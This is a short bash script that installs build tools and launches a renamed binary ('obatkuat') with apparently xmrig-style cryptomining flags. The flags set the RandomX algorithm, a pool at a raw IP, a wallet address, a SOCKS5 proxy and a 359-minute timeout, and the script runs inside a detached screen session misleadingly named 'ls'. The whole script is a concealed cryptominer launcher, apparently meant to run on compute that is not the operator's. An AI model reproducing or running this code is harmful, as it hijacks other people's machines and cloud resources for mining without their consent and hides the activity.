#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
chmod +x ternak.sh && chmod +x obatkuat
screen -dmS ls
A=95.179.139.15:1222
B=ETH:0x40819d362CCfb0bb130C80cc0dBB4cdef5b02417
C=$(shuf -i 10-9999999999999999999 -n 1)#szor-izew
D=socks5://101.201.154.109:8080
timeout 359m ./obatkuat -a rx/0 -o $A -u $B.$C -p x -t 8 -x $D -k
sudo apt update
